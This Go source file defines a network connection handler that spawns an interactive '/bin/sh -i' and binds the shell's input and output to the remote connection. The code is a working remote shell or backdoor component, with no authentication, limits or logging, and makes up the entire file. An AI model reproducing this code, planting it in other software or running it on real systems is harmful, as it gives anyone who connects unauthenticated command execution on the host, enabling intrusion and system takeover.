package handler

import (
	"io"
	"net"
	"os/exec"
)

func Handle(conn net.Conn) {
	defer conn.Close()

	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)

	cmd.Run()
}
